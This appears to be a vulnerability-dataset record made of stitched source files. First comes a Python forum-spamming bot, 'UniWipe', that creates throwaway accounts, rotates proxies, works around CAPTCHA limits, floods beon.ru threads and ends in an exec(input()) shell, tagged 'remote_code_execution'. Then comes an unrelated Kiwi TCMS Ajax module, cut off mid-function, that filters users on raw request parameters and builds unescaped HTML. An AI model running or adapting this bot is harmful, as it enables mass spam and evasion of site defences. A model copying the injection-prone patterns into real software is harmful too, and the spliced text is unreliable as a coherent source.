config.dictConfig(logging_config)
logger = logging.getLogger()

ctx = zmq.Context()
sig_addr = 'ipc://signals'
sig_sock = ctx.socket(zmq.PUB)
sig_sock.bind(sig_addr)

# Settings for you
domains = set() # d.witch_domains
targets = dict() # d.witch_targets
protected = set() # will be removed later
forums = dict() # target forums

# from lib import textgen
# with open('data.txt', 'rt') as f:
#     model = textgen.train(f.read())
# def mesasge():
#     while True:
#         s = textgen.generate_sentence(model)
#         try:
#             s.encode('cp1251')
#             break
#         except Exception:
#             continue
#     return s

def message():
    msg = []
    # msg.append('[video-youtube-'+
    #            random.choice(('3odl-KoNZwk', 'bu55q_3YtOY', '4YPiCeLwh5o',
    #                           'eSBybJGZoCU', 'ZtWTUt2RZh0', 'VXa9tXcMhXQ',))
    #            +']')
    msg.append('[image-original-none-http://simg4.gelbooru.com/'
               + '/images/db/1d/db1dfb62a40f5ced2043bb8966da9a98.png]')
    msg.append('Каждый хочет дружить с ядерной бомбой.')
    # msg.append('[video-youtube-'+random.choice(
    #     # ('WdDb_RId-xU', 'EFL1-fL-WtM', 'uAOoiIkFQq4',
    #     #  'eZO3K_4yceU', '1c1lT_HgJNo', 'WOkvVVaJ2Ks',
    #     #  'KYq90TEdxIE', 'rWBM2whL0bI', '0PDy_MKYo4A'))
    #     #('GabBLLOT6vw', 'qgvOpSquCAY', 'zUe-z9DZBNo', '4fCbfDEKZss', 'uIE-JgmkmdM'))
    #     ('42JQYPioVo4', 'jD6j072Ep1M', 'mPyF5ovoIVs', 'cEEi1BHycb0', 'PuA1Wf8nkxw',
    #      'ASJ9qlsPgHU', 'DP1ZDW9_xOo', 'bgSqH9LT-mI', ))
    # +']')
    # http://simg2.gelbooru.com//images/626/58ca1c9a8ffcdedd0e2eb6f33c9389cb7588f0d1.jpg
    # msg.append('Enjoy the view!')
    msg.append(str(random.randint(0, 9999999999)))
    return '\n'.join(msg)

def sbjfun():
    # return 'Out of the darkness we will rise, into the light we will dwell'
    return sup.randstr(1, 30)

# End
import argparse

parser = argparse.ArgumentParser(add_help=True)
parser.add_argument('--only-cache', '-C', action='store_true',
    help=""Disables any requests in DataLoader (includes Witch)"")
parser.add_argument('--no-shell', '-N', action='store_true',
    help=""Sleep instead of starting the shell"")
parser.add_argument('--tcount', '-t', type=int, default=10,
    help='WipeThread count')
parser.add_argument('--ecount', '-e', type=int, default=0,
    help='EvaluatorProxy count')
parser.add_argument('--upload-avatar', action='store_true', default=False,
    help='Upload random avatar after registration')
parser.add_argument('--av-dir', default='randav', help='Directory with avatars')
parser.add_argument('--rp-timeout', '-T', type=int, default=10,
    help='Default rp timeout in seconds')
parser.add_argument('--conlimit', type=int, default=3,
    help='http_request conlimit')
parser.add_argument('--noproxy-timeout', type=int, default=5,
    help='noproxy_rp timeout')

parser.add_argument('--caprate_minp', type=int, default=5,
    help='Cap rate minimum possible count for limit check')
parser.add_argument('--caprate_limit', type=float, default=0.8,
    help='Captcha rate limit')

parser.add_argument('--comment_successtimeout', type=float, default=0.8,
    help='Comment success timeout')
parser.add_argument('--topic_successtimeout', type=float, default=0.1,
    help='Topic success timeout')
parser.add_argument('--errortimeout', type=float, default=3,
    help='Error timeout')


parser.add_argument('--stop-on-closed', action='store_true', default=False,
    help='Forget about closed topics')
parser.add_argument('--die-on-neterror', action='store_true', default=False,
    help='Terminate spawn in case of too many NetErrors')

c = parser.parse_args()

# rps = {}

noproxy_rp = sup.net.RequestPerformer()
noproxy_rp.proxy = ''
noproxy_rp.timeout = c.noproxy_timeout
noproxy_rp.timeout = c.rp_timeout

# rps[''] = noproxy_rp

# Achtung: DataLoader probably isn't thread-safe.
d = DataLoader(noproxy_rp, c.only_cache)
c.router_addr = d.addrs['rpcrouter']
noproxy_rp.useragent = random.choice(d.ua_list)

def terminate():
    logger.info('Shutdown initiated')
    # send_passthrough([b'GLOBAL', b'WZWorker', b'terminate'])
    send_to_wm([b'GLOBAL', b'WZWorker', b'terminate'])
    for t in threading.enumerate():
        if isinstance(t, threading.Timer):
            t.cancel()
    # try:
    #     wm.term()
    #     wm.join()
    # except: # WM instance is not created yet.
    #     pass
    logger.info('Exiting')

def interrupt_handler(signal, frame):
    pass # Just do nothing

def terminate_handler(signal, frame):
    terminate()

signal.signal(signal.SIGINT, interrupt_handler)
signal.signal(signal.SIGTERM, terminate_handler)

def make_net(proxy, proxytype):
    # if proxy in rps:
    #     return rps[proxy]
    net = sup.net.RequestPerformer()
    net.proxy = proxy
    if proxytype == 'HTTP' or proxytype == 'HTTPS':
        net.proxy_type = sup.proxytype.http
    elif proxytype == 'SOCKS4':
        net.proxy_type = sup.proxytype.socks4
    elif proxytype == 'SOCKS5':
        net.proxy_type = sup.proxytype.socks5
    else:
        raise TypeError('Invalid proxytype %s' % proxytype)
    # rps[proxy] = net
    net.useragent = random.choice(d.ua_list)
    net.timeout = c.rp_timeout
    return net

# UniWipe patching start
def upload_avatar(self, ud):
    if ('avatar_uploaded' in ud[0] and
        ud[0]['avatar_uploaded'] is True):
        return
    files = []
    for sd in os.walk(c.av_dir):
        files.extend(sd[2])
    av = os.path.join(sd[0], random.choice(files))
    self.log.info('Uploading %s as new avatar', av)
    self.site.uploadavatar('0', av)
    ud[0]['avatar'] = av
    ud[0]['avatar_uploaded'] = True

from lib.mailinator import Mailinator
# from lib.tempmail import TempMail as Mailinator

# Move this to WipeManager
def create_spawn(proxy, proxytype, pc, uq=None):
    for domain in domains:
        if domain in targets:
            tlist = targets[domain]
        else:
            tlist = list()
            targets[domain] = tlist
        if domain in forums:
            fset = forums[domain]
        else:
            fset = set()
            forums[domain] = fset
        net = make_net(proxy, proxytype)
        net.cookiefname = (proxy if proxy else 'noproxy')+'_'+domain
        w = UniWipe(fset, tlist, sbjfun, message, pc, net, domain, Mailinator,
            uq(domain) if uq else None)
        w.stoponclose = c.stop_on_closed
        w.die_on_neterror = c.die_on_neterror
        w.caprate_minp = c.caprate_minp
        w.caprate_limit = c.caprate_limit
        w.conlimit = c.conlimit
        w.comment_successtimeout = 0.2
        if c.upload_avatar:
            w.hooks['post_login'].append(upload_avatar)
        yield w

# UniWipe patching end

class WipeManager:
    def __init__(self, config, *args, **kvargs):
        super().__init__(*args, **kvargs)
        self.newproxyfile = 'newproxies.txt'
        self.proxylist = set()
        self.c = config
        self.threads = []
        self.processes = []
        self.th_sa = 'inproc://wm-wth.sock'
        self.th_ba = 'inproc://wm-back.sock'
        self.pr_sa = 'ipc://wm-wpr.sock'
        self.pr_ba = 'ipc://wm-back.sock'
        self.userqueues = {}
        self.usersfile = 'wm_users.pickle'
        self.targetsfile = 'wm_targets.pickle'
        self.bumplimitfile = 'wm_bumplimit.pickle'

    def init_th_sock(self):
        self.log.info(
            'Initializing intraprocess signal socket %s', self.th_sa)
        self.th_sock = self.p.ctx.socket(zmq.PUB)
        self.th_sock.bind(self.th_sa)

    def init_th_back_sock(self):
        self.log.info(
            'Initializing intraprocess backward socket %s', self.th_ba)
        self.th_back_sock = self.p.ctx.socket(zmq.ROUTER)
        self.th_back_sock.bind(self.th_ba)

    def init_pr_sock(self):
        self.log.info(
            'Initializing interprocess signal socket %s', self.pr_sa)
        self.pr_sock = self.p.ctx.socket(zmq.PUB)
        self.pr_sock.bind(self.pr_sa)

    def init_pr_back_sock(self):
        self.log.info(
            'Initializing interprocess backward socket %s', self.pr_ba)
        self.pr_back_sock = self.p.ctx.socket(zmq.ROUTER)
        self.pr_back_sock.bind(self.pr_ba)

    def read_newproxies(self):
        if not os.path.isfile(self.newproxyfile):
            return
        newproxies = set()
        with open(self.newproxyfile, 'rt') as f:
            for line in f:
                try:
                    line = line.rstrip('\n')
                    proxypair = tuple(line.split(' '))
                    if len(proxypair) < 2:
                        self.log.warning('Line %s has too few spaces', line)
                        continue
                    if len(proxypair) > 2:
                        self.log.debug('Line %s has too much spaces', line)
                        proxypair = (proxypair[0], proxypair[1])
                    newproxies.add(proxypair)
                except Exception as e:
                    self.log.exception('Line %s raised exception %s', line, e)
        # os.unlink(self.newproxyfile)
        return newproxies.difference(self.proxylist)

    def add_spawns(self, proxypairs):
        while self.running.is_set():
            try:
                try:
                    proxypair = proxypairs.pop()
                except Exception:
                    return
                self.proxylist.add(proxypair)
                for spawn in create_spawn(proxypair[0], proxypair[1], self.pc,
                        self.get_userqueue):
                    self.log.info('Created spawn %s', spawn.name)
                    self.spawnqueue.put(spawn, False)
            except Exception as e:
                self.log.exception('Exception ""%s"" raised on create_spawn', e)

    def spawn_workers(self, wclass, count, args=(), kvargs={}):
        wname = str(wclass.__name__)
        self.log.info('Starting %s(s)', wname)
        if issubclass(wclass, workers.WZWorkerThread):
            type_ = 0
            if not hasattr(self, 'th_sock'):
                self.init_th_sock()
            if not hasattr(self, 'th_back_sock'):
                self.init_th_back_sock()
        elif issubclass(wclass, workers.WZWorkerProcess):
            type_ = 1
            if not hasattr(self, 'pr_sock'):
                self.init_pr_sock()
            if not hasattr(self, 'pr_back_sock'):
                self.init_pr_back_sock()
        else:
            raise Exception('Unknown wclass type')
        for i in range(count):
            if not self.running.is_set():
                break
            try:
                w = wclass(*args, name='.'.join(
                    (wname, ('pr{0}' if type_ else 'th{0}').format(i))),
                    **kvargs)
                if type_ == 0:
                    self.threads.append(w)
                    w.start(self.p.ctx, self.th_sa)
                elif type_ == 1:
                    self.processes.append(w)
                    w.start(self.pr_sa)
            except Exception as e:
                self.log.exception('Exception ""%s"" raised on %s spawn',
                                   e, wname)

    def spawn_nworkers(self, type_, fun, count, args=(), kvargs={}):
        wname = str(fun.__name__)
        self.log.info('Starting %s(s)', wname)
        if type_ == 0:
            if not hasattr(self, 'th_sock'):
                self.init_th_sock()
            if not hasattr(self, 'th_back_sock'):
                self.init_th_back_sock()
        elif type_ == 1:
            if not hasattr(self, 'pr_sock'):
                self.init_pr_sock()
            if not hasattr(self, 'pr_back_sock'):
                self.init_pr_back_sock()
        else:
            raise Exception('Unknown wclass type')
        for i in range(count):
            if not self.running.is_set():
                break
            try:
                if type_ == 0:
                    w = workers.WZWorkerThread(
                        self.c.router_addr, fun, args, kvargs,
                        name='.'.join((wname, 'th{0}'.format(i))))
                    self.threads.append(w)
                    w.start(self.p.ctx, self.th_sa)
                elif type_ == 1:
                    w = workers.WZWorkerProcess(self.c.router_addr, fun, args, kvargs,
                        name='.'.join((wname, 'pr{0}'.format(i))))
                    self.processes.append(w)
                    w.start(self.pr_sa)
            except Exception as e:
                self.log.exception('Exception ""%s"" raised on %s spawn',
                                   e, wname)

    def spawn_wipethreads(self):
        return self.spawn_nworkers(0, WipeThread, self.c.tcount,
                                  (self.pc, self.spawnqueue))

    def spawn_evaluators(self):
        self.log.info('Initializing Evaluator')
        from evproxy import EvaluatorProxy
        def ev_init():
            from lib.evaluators.PyQt4Evaluator import Evaluator
            return Evaluator()
        return self.spawn_nworkers(1, EvaluatorProxy, self.c.ecount,
                                  (ev_init,))

    def load_users(self):
        if not os.path.isfile(self.usersfile):
            return
        with open(self.usersfile, 'rb') as f:
            users = pickle.loads(f.read())
        try:
            for domain in users.keys():
                uq = Queue()
                for ud in users[domain]:
                    self.log.debug('Loaded user %s:%s', domain, ud['login'])
                    uq.put(ud)
                self.userqueues[domain] = uq
        except Exception as e:
            self.log.exception(e)
            self.log.error('Failed to load users')

    def save_users(self):
        users = {}
        for d, uq in self.userqueues.items():
            uqsize = uq.qsize()
            uds = []
            for i in range(uqsize):
                uds.append(uq.get(False))
            users[d] = uds
        with open(self.usersfile, 'wb') as f:
            f.write(pickle.dumps(users, pickle.HIGHEST_PROTOCOL))
        self.log.info('Saved users')

    def get_userqueue(self, domain):
        try:
            uq = self.userqueues[domain]
        except KeyError:
            self.log.info('Created userqueue for %s', domain)
            uq = Queue()
            self.userqueues[domain] = uq
        return uq

    def load_targets(self):
        fname = self.targetsfile
        if not os.path.isfile(fname):
            return
        with open(fname, 'rb') as f:
            data = pickle.loads(f.read())
        if 'targets' in data:
            self.log.debug('Target list was loaded')
            targets.update(data['targets'])
        if 'forums' in data:
            self.log.debug('Forum set was loaded')
            forums.update(data['forums'])
        if 'domains' in data:
            self.log.debug('Domain set was loaded')
            domains.update(data['domains'])
        if 'sets' in data:
            self.log.debug('Other sets were loaded')
            self.pc.sets.update(data['sets'])

    def load_bumplimit_set(self):
        if not os.path.isfile(self.bumplimitfile):
            return
        with open(self.bumplimitfile, 'rb') as f:
            self.pc.sets['bumplimit'].update(pickle.loads(f.read()))

    def save_targets(self):
        data = {
            'targets': targets,
            'forums': forums,
            'domains': domains,
            'sets': self.pc.sets,
            }
        with open(self.targetsfile, 'wb') as f:
            f.write(pickle.dumps(data, pickle.HIGHEST_PROTOCOL))

    def targets_from_witch(self):
        for t in d.witch_targets:
            if t['domain'] == 'beon.ru' and t['forum'] == 'anonymous':
                try:
                    add_target_exc(t['id'], t['user'])
                except ValueError:
                    pass

    def terminate(self):
        msg = [b'GLOBAL']
        msg.extend(wzrpc.make_sig_msg(b'WZWorker', b'terminate', []))
        if hasattr(self, 'th_sock'):
            self.th_sock.send_multipart(msg)
        if hasattr(self, 'pr_sock'):
            self.pr_sock.send_multipart(msg)

    def join_threads(self):
        for t in self.threads:
            t.join()

    def send_passthrough(self, interface, method, frames):
        msg = [frames[0]]
        msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))
        self.th_sock.send_multipart(msg)
        self.pr_sock.send_multipart(msg)

    def __call__(self, parent):
        self.p = parent
        self.log = parent.log
        self.inter_sleep = parent.inter_sleep
        self.running = parent.running
        self.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeManager')
        self.p.wz.set_sig_handler(b'WipeManager', b'passthrough', self.send_passthrough)
        if self.c.tcount > 0:
            self.pc = ProcessContext(self.p.name, self.p.ctx,
                self.c.router_addr, noproxy_rp)
            self.spawnqueue = Queue()
            self.load_bumplimit_set()
            self.load_targets()
            self.load_users()
            self.spawn_wipethreads()
        if self.c.ecount > 0:
            self.spawn_evaluators()
        try:
            while self.running.is_set():
                # self.targets_from_witch()
                if self.c.tcount == 0:
                    self.inter_sleep(5)
                    continue
                self.pc.check_waiting()
                new = self.read_newproxies()
                if not new:
                    self.inter_sleep(5)
                    continue
                self.add_spawns(new)
        except WorkerInterrupt:
            pass
        except Exception as e:
            self.log.exception(e)
        self.terminate()
        self.join_threads()
        if self.c.tcount > 0:
            self.save_users()
            self.save_targets()

wm = workers.WZWorkerThread(c.router_addr, WipeManager, (c,),
    name='SpaghettiMonster')
wm.start(ctx, sig_addr)

def add_target(domain, id_, tuser=None):
    if domain not in targets:
        targets[domain] = []
    tlist = targets[domain]
    id_ = str(id_)
    tuser = tuser or ''
    t = (tuser, id_)
    logger.info('Appending %s to targets[%s]', repr(t), domain)
    tlist.append(t)

def remove_target(domain, id_, tuser=None):
    tlist = targets[domain]
    id_ = str(id_)
    tuser = tuser or ''
    t = (tuser, id_)
    logger.info('Removing %s from targets[%s]', repr(t), domain)
    tlist.remove(t)

def add_target_exc(domain, id_, tuser=None):
    if domain not in targets:
        targets[domain] = []
    tlist = targets[domain]
    id_ = str(id_)
    tuser = tuser or ''
    t = (tuser, id_)
    if t in protected:
        raise ValueError('%s is protected' % repr(t))
    if t not in tlist:
        logger.info('Appending %s to targets[%s]', repr(t), domain)
        tlist.append(t)

r_di = re.compile(regexp.f_udi)

def atfu(urls):
    for user, domain, id1, id2 in r_di.findall(urls):
        id_ = id1+id2
        add_target(domain, id_, user)

def rtfu(urls):
    for user, domain, id1, id2 in r_di.findall(urls):
        id_ = id1+id2
        remove_target(domain, id_, user)

def get_forum_id(name):
    id_ = d.bm_id_forum.get_key(name)
    int(id_, 10)  # id is int with base 10
    return id_

# def aftw(name):
#     id_ = get_forum_id(name)
#     logger.info('Appending %s (%s) to forums', name, id_)
#     forums.append(id_)

# def rffw(name):
#     id_ = get_forum_id(name)
#     logger.info('Removing %s (%s) from forums', name, id_)
#     forums.remove(id_)

# def aftw(name):
#     id_ = get_forum_id(name)
#     logger.info('Appending %s to forums', name)
#     forums.add(name)

# def rffw(name):
#     id_ = get_forum_id(name)
#     logger.info('Removing %s from forums', name)
#     forums.remove(name)

r_udf = re.compile(regexp.udf_prefix)

def affu(urls):
    for user, domain, forum in r_udf.findall(urls):
        if domain not in forums:
            forums[domain] = set()
        if len(forum) > 0:
            get_forum_id(forum)
        logger.info('Appending %s:%s to forums[%s]', user, forum, domain)
        forums[domain].add((user, forum))

def rffu(urls):
    for user, domain, forum in r_udf.findall(urls):
        if len(forum) > 0:
            get_forum_id(forum)
        logger.info('Removing %s:%s from forums[%s]', user, forum, domain)
        forums[domain].remove((user, forum))

def add_user(domain, login, passwd):
    uq = wm.get_userqueue(domain)
    uq.put({'login': login, 'passwd': passwd}, False)

def send_to_wm(frames):
    msg = [frames[0]]
    msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))
    sig_sock.send_multipart(msg)

def send_passthrough(frames):
    msg = [b'WipeManager']
    msg.extend(wzrpc.make_sig_msg(b'WipeManager', b'passthrough', frames))
    sig_sock.send_multipart(msg)

def drop_users():
    send_passthrough([b'WipeSkel', b'WipeSkel', b'drop-user'])

def log_spawn_name():
    send_passthrough([b'WipeThread', b'WipeThread', b'log-spawn-name'])

if c.no_shell:
    while True:
        time.sleep(1)
else:
    try:
        import IPython
        IPython.embed()
    except ImportError:
        # fallback shell
        while True:
            try:
                exec(input('> '))
            except KeyboardInterrupt:
                print(""KeyboardInterrupt"")
            except SystemExit:
                break
            except:
                print(traceback.format_exc())

terminate()
/n/n/n/uniwipe.py/n/n# -*- coding: utf-8 -*-
# -*- mode: python -*-
from sup.net import NetError
from wzworkers import WorkerInterrupt
from wipeskel import WipeSkel, WipeState, cstate
from beon import exc, regexp
import re

class UniWipe(WipeSkel):
    def __init__(self, forums, targets, sbjfun, msgfun, *args, **kvargs):
        self.sbjfun = sbjfun
        self.msgfun = msgfun
        self.forums = forums
        self.targets = (type(targets) == str and [('', targets)]
                        or type(targets) == tuple and list(targets)
                        or targets)
        super().__init__(*args, **kvargs)

    def on_caprate_limit(self, rate):
        if not self.logined:
            self._capdata = (0, 0)
            return
        self.log.warning('Caprate limit reached, calling dologin() for now')
        self.dologin()
        # super().on_caprate_limit(rate)

    def comment_loop(self):
        for t in self.targets:
            self.schedule(self.add_comment, (t, self.msgfun()))
        if len(self.targets) == 0:
            self.schedule(self.scan_targets_loop)
        else:
            self.schedule(self.comment_loop)

    def add_comment(self, t, msg):
        # with cstate(self, WipeState.posting_comment):
        if True: # Just a placeholder
            try:
                # self.counter_tick()
                self.postmsg(t[1], msg, t[0])
            except exc.Success as e:
                self.counters['comments'] += 1
                self.w.sleep(self.comment_successtimeout)
            except exc.Antispam as e:
                self.w.sleep(self.comment_successtimeout)
                self.schedule(self.add_comment, (t, msg))
            except (exc.Closed, exc.UserDeny) as e:
                try:
                    self.targets.remove(t)
                except ValueError:
                    pass
                self.w.sleep(self.comment_successtimeout)
            except exc.Captcha as e:
                self.log.error('Too many wrong answers to CAPTCHA')
                self.schedule(self.add_comment, (t, msg))
            except exc.UnknownAnswer as e:
                self.log.warn('%s: %s', e, e.answer)
                self.schedule(self.add_comment, (t, msg))
            except exc.Wait5Min as e:
                self.schedule(self.add_comment, (t, msg))
                self.schedule_first(self.switch_user)
            except exc.EmptyAnswer as e:
                self.log.info('Removing %s from targets', t)
                try:
                    self.targets.remove(t)
                except ValueError as e:
                    pass
                self.w.sleep(self.errortimeout)
            except exc.TemporaryError as e:
                self.schedule(self.add_comment, (t, msg))
                self.w.sleep(self.errortimeout)
            except exc.PermanentError as e:
                try:
                    self.targets.remove(t)
                except ValueError as e:
                    pass
                self.w.sleep(self.errortimeout)
            except UnicodeDecodeError as e:
                self.log.exception(e)
                self.w.sleep(self.errortimeout)

    def forumwipe_loop(self):
        for f in self.forums:
            self.counter_tick()
            try:
                self.addtopic(self.msgfun(), self.sbjfun(), f)
            except exc.Success as e:
                self.counters['topics'] += 1
                self.w.sleep(self.topic_successtimeout)
            except exc.Wait5Min as e:
                self.topic_successtimeout = self.topic_successtimeout + 0.1
                self.log.info('Wait5Min exc caught, topic_successtimeout + 0.1, cur: %f',
                    self.topic_successtimeout)
                self.w.sleep(self.topic_successtimeout)
            except exc.Captcha as e:
                self.log.error('Too many wrong answers to CAPTCHA')
                self.long_sleep(10)
            except exc.UnknownAnswer as e:
                self.log.warning('%s: %s', e, e.answer)
                self.w.sleep(self.errortimeout)
            except exc.PermanentError as e:
                self.log.error(e)
                self.w.sleep(self.errortimeout)
            except exc.TemporaryError as e:
                self.log.warn(e)
                self.w.sleep(self.errortimeout)

    def get_targets(self):
        found_count = 0
        for user, forum in self.forums:
            targets = []
            self.log.debug('Scanning first page of the forum %s:%s', user, forum)
            page = self.site.get_page('1', forum, user)
            rxp = re.compile(regexp.f_sub_id.format(user, self.site.domain, forum))
            found = set(map(lambda x: (user, x[0]+x[1]), rxp.findall(page)))
            for t in found:
                if (t in self.pc.sets['closed']
                    or t in self.pc.sets['bumplimit']
                    or t in self.targets):
                    continue
                targets.append(t)
            lt = len(targets)
            found_count += lt
            if lt > 0:
                self.log.info('Found %d new targets in forum %s:%s', lt, user, forum)
            else:
                self.log.debug('Found no new targets in forum %s:%s', user, forum)
            self.targets.extend(targets)
        return found_count

    def scan_targets_loop(self):
        with cstate(self, WipeState.scanning_for_targets):
            while len(self.targets) == 0:
                c = self.get_targets()
                if c == 0:
                    self.log.info('No targets found at all, sleeping for 30 seconds')
                    self.long_sleep(30)
            self.schedule(self.comment_loop)
        if len(self.forums) == 0:
            self.schedule(self.wait_loop)

    def wait_loop(self):
        if len(self.targets) > 0:
            self.schedule(self.comment_loop)
            return
        if len(self.forums) == 0:
            with cstate(self, WipeState.waiting_for_targets):
                while len(self.forums) == 0:
                    # To prevent a busy loop.
                    self.counter_tick()
                    self.w.sleep(1)
        self.schedule(self.scan_targets_loop)

    def _run(self):
        self.schedule(self.dologin)
        self.schedule(self.wait_loop)
        self.schedule(self.counter_ticker.tick)
        try:
            self.perform_tasks()
        except NetError as e:
            self.log.error(e)
        except WorkerInterrupt as e:
            self.log.warning(e)
        except Exception as e:
            self.log.exception(e)
        self.return_user()
# tw_flag = False
# if len(self.targets) > 0:
#     with cstate(self, WipeState.posting_comment):
#         while len(self.targets) > 0:
#             self.threadwipe_loop()
#     if not tw_flag:
#         tw_flag = True
# if tw_flag:
#     # Sleep for topic_successtimeout after last comment
#     # to prevent a timeout spike
#     self.w.sleep(self.topic_successtimeout)
#     tw_flag = False
# with cstate(self, WipeState.posting_topic):
# self.forumwipe_loop()
/n/n/n",1,remote_code_execution
6,60,bb986000ed3cb222832e1e4535dd6316d32503f8,"tcms/core/ajax.py/n/n# -*- coding: utf-8 -*-
""""""
Shared functions for plan/case/run.

Most of these functions are use for Ajax.
""""""
import datetime
import json
from distutils.util import strtobool

from django import http
from django.db.models import Q, Count
from django.contrib.auth.models import User
from django.core import serializers
from django.core.exceptions import ObjectDoesNotExist
from django.apps import apps
from django.forms import ValidationError
from django.http import Http404
from django.http import HttpResponse
from django.shortcuts import render
from django.views.decorators.http import require_GET
from django.views.decorators.http import require_POST

from tcms.signals import POST_UPDATE_SIGNAL
from tcms.management.models import Component, Build, Version
from tcms.management.models import Priority
from tcms.management.models import Tag
from tcms.management.models import EnvGroup, EnvProperty, EnvValue
from tcms.testcases.models import TestCase, Bug
from tcms.testcases.models import Category
from tcms.testcases.models import TestCaseStatus, TestCaseTag
from tcms.testcases.views import plan_from_request_or_none
from tcms.testplans.models import TestPlan, TestCasePlan, TestPlanTag
from tcms.testruns.models import TestRun, TestCaseRun, TestCaseRunStatus, TestRunTag
from tcms.core.helpers.comments import add_comment
from tcms.core.utils.validations import validate_bug_id


def check_permission(request, ctype):
    perm = '%s.change_%s' % tuple(ctype.split('.'))
    if request.user.has_perm(perm):
        return True
    return False


def strip_parameters(request_dict, skip_parameters):
    parameters = {}
    for key, value in request_dict.items():
        if key not in skip_parameters and value:
            parameters[str(key)] = value

    return parameters


@require_GET
def info(request):
    """"""Ajax responder for misc information""""""

    objects = _InfoObjects(request=request, product_id=request.GET.get('product_id'))
    info_type = getattr(objects, request.GET.get('info_type'))

    if not info_type:
        return HttpResponse('Unrecognizable info-type')

    if request.GET.get('format') == 'ulli':
        field = request.GET.get('field', default='name')

        response_str = '<ul>'
        for obj_value in info_type().values(field):
            response_str += '<li>' + obj_value.get(field, None) + '</li>'
        response_str += '</ul>'

        return HttpResponse(response_str)

    return HttpResponse(serializers.serialize('json', info_type(), fields=('name', 'value')))


class _InfoObjects(object):

    def __init__(self, request, product_id=None):
        self.request = request
        try:
            self.product_id = int(product_id)
        except (ValueError, TypeError):
            self.product_id = 0

    def builds(self):
        try:
            is_active = strtobool(self.request.GET.get('is_active', default='False'))
        except (ValueError, TypeError):
            is_active = False

        return Build.objects.filter(product_id=self.product_id, is_active=is_active)

    def categories(self):
        return Category.objects.filter(product__id=self.product_id)

    def components(self):
        return Component.objects.filter(product__id=self.product_id)

    def env_groups(self):
        return EnvGroup.objects.all()

    def env_properties(self):
        if self.request.GET.get('env_group_id'):
            return EnvGroup.objects.get(id=self.request.GET['env_group_id']).property.all()
        return EnvProperty.objects.all()

    def env_values(self):
        return EnvValue.objects.filter(property__id=self.request.GET.get('env_property_id'))

    def users(self):
        query = strip_parameters(self.request.GET, skip_parameters=('info_type', 'field', 'format'))
        return User.objects.filter(**query)

    def versions(self):
        return Version.objects.filter(product__id=self.product_id)


def tags(request):
    """""" Get tags for TestPlan, TestCase or TestRun """"""

    tag_objects = _TagObjects(request)
    template_name, obj = tag_objects.get()

    q_tag = request.GET.get('tags')
    q_action = request.GET.get('a')

    if q_action:
        tag_actions = _TagActions(obj=obj, tag_name=q_tag)
        getattr(tag_actions, q_action)()

    all_tags = obj.tag.all().order_by('pk')
    test_plan_tags = TestPlanTag.objects.filter(
        tag__in=all_tags).values('tag').annotate(num_plans=Count('tag')).order_by('tag')
    test_case_tags = TestCaseTag.objects.filter(
        tag__in=all_tags).values('tag').annotate(num_cases=Count('tag')).order_by('tag')
    test_run_tags = TestRunTag.objects.filter(
        tag__in=all_tags).values('tag').annotate(num_runs=Count('tag')).order_by('tag')

    plan_counter = _TagCounter('num_plans', test_plan_tags)
    case_counter = _TagCounter('num_cases', test_case_tags)
    run_counter = _TagCounter('num_runs', test_run_tags)

    for tag in all_tags:
        tag.num_plans = plan_counter.calculate_tag_count(tag)
        tag.num_cases = case_counter.calculate_tag_count(tag)
        tag.num_runs = run_counter.calculate_tag_count(tag)

    context_data = {
        'tags': all_tags,
        'object': obj,
    }
    return render(request, template_name, context_data)


class _TagObjects(object):
    """""" Used for getting the chosen object(TestPlan, TestCase or TestRun) from the database """"""

    def __init__(self, request):
        """"""
        :param request: An HTTP GET request, containing the primary key
                        and the type of object to be selected
        :type request: HttpRequest
        """"""
        for obj in ['plan', 'case', 'run']:
            if request.GET.get(obj):
                self.object = obj
                self.object_pk = request.GET.get(obj)
                break

    def get(self):
        func = getattr(self, self.object)
        return func()

    def plan(self):
        return 'management/get_tag.html', TestPlan.objects.get(pk=self.object_pk)

    def case(self):
        return 'management/get_tag.html', TestCase.objects.get(pk=self.object_pk)

    def run(self):
        return 'run/get_tag.html', TestRun.objects.get(pk=self.object_pk)


class _TagActions(object):
    """""" Used for performing the 'add' and 'remove' actions on a given tag """"""

    def __init__(self, obj, tag_name):
        """"""
        :param obj: the object for which the tag actions would be performed
        :type obj: either a :class:`tcms.testplans.models.TestPlan`,
                          a :class:`tcms.testcases.models.TestCase` or
                          a :class:`tcms.testruns.models.TestRun`
        :param tag_name: The name of the tag to be manipulated
        :type tag_name: str
        """"""
        self.obj = obj
        self.tag_name = tag_name

    def add(self):
        tag, _ = Tag.objects.get_or_create(name=self.tag_name)
        self.obj.add_tag(tag)

    def remove(self):
        tag = Tag.objects.get(name=self.tag_name)
        self.obj.remove_tag(tag)


class _TagCounter(object):
    """""" Used for counting the number of times a tag is assigned to TestRun/TestCase/TestPlan """"""

    def __init__(self, key, test_tags):
        """"""
         :param key: either 'num_plans', 'num_cases', 'num_runs', depending on what you want count
         :type key: str
         :param test_tags: query set, containing the Tag->Object relationship, ordered by tag and
                            annotated by key
            e.g. TestPlanTag, TestCaseTag ot TestRunTag
         :type test_tags: QuerySet
        """"""
        self.key = key
        self.test_tags = iter(test_tags)
        self.counter = {'tag': 0}

    def calculate_tag_count(self, tag):
        """"""
        :param tag: the tag you do the counting for
        :type tag: :class:`tcms.management.models.Tag`
        :return: the number of times a tag is assigned to object
        :rtype: int
        """"""
        if self.counter['tag'] != tag.pk:
            try:
                self.counter = self.test_tags.__next__()
            except StopIteration:
                return 0

        if tag.pk == self.counter['tag']:
            return self.counter[self.key]
        return 0


def get_value_by_type(val, v_type):
    """"""
    Exampls:
    1. get_value_by_type('True', 'bool')
    (1, None)
    2. get_value_by_type('19860624 123059', 'datetime')
    (datetime.datetime(1986, 6, 24, 12, 30, 59), None)
    3. get_value_by_type('5', 'int')
    ('5', None)
    4. get_value_by_type('string', 'str')
    ('string', None)
    5. get_value_by_type('everything', 'None')
    (None, None)
    6. get_value_by_type('buggy', 'buggy')
    (None, 'Unsupported value type.')
    7. get_value_by_type('string', 'int')
    (None, ""invalid literal for int() with base 10: 'string'"")
    """"""
    value = error = None

    def get_time(time):
        date_time = datetime.datetime
        if time == 'NOW':
            return date_time.now()
        return date_time.strptime(time, '%Y%m%d %H%M%S')

    pipes = {
        # Temporary solution is convert all of data to str
        # 'bool': lambda x: x == 'True',
        'bool': lambda x: x == 'True' and 1 or 0,
        'datetime': get_time,
        'int': lambda x: str(int(x)),
        'str': lambda x: str(x),
        'None': lambda x: None,
    }
    pipe = pipes.get(v_type, None)
